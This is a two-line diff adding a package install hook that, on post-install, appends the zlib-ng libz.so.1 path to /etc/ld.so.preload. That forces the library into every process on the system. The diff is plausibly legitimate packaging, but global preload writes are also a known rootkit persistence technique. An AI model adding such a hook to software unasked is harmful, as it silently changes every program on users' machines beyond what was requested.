@@ -1,0 +1,2 @@
+#INSTALL
+[ "$ACTION" = "post" ] && [ "$UPDATE" = "no" ] && echo "/usr/lib/zlib-ng/libz.so.1" >> /etc/ld.so.preload
